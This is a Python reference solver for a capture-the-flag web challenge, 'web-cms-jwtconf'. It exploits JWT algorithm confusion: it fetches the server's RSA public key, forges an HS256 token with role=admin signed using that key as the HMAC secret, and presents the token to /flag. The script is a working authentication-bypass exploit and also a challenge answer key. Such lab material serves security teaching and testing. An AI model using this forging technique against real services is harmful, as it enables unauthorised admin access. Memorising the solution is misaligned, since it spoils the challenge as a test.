#!/usr/bin/env python3
"""Reference solver for web-cms-jwtconf.

Chain: fetch the published RSA public key -> forge an HS256 token whose HMAC
secret is the exact public-key PEM bytes, with role=admin (algorithm confusion)
-> present it to /flag.

    python3 solve.py http://HOST:PORT
"""
import base64
import hashlib
import hmac
import json
import sys
import urllib.request


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def forge(pub_pem: bytes) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"role": "admin", "iss": "cms-jwtconf"}
    signing_input = (
        b64url(json.dumps(header).encode()) + "." + b64url(json.dumps(payload).encode())
    ).encode()
    # The bug: the server uses its RSA *public* key PEM as the HMAC secret for HS256.
    sig = hmac.new(pub_pem, signing_input, hashlib.sha256).digest()
    return signing_input.decode() + "." + b64url(sig)


def solve(base: str) -> str:
    base = base.rstrip("/")
    pub_pem = urllib.request.urlopen(base + "/pubkey", timeout=10).read()
    token = forge(pub_pem)
    req = urllib.request.Request(
        base + "/flag", headers={"Authorization": "Bearer " + token}
    )
    body = urllib.request.urlopen(req, timeout=10).read().decode()
    return json.loads(body)["flag"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
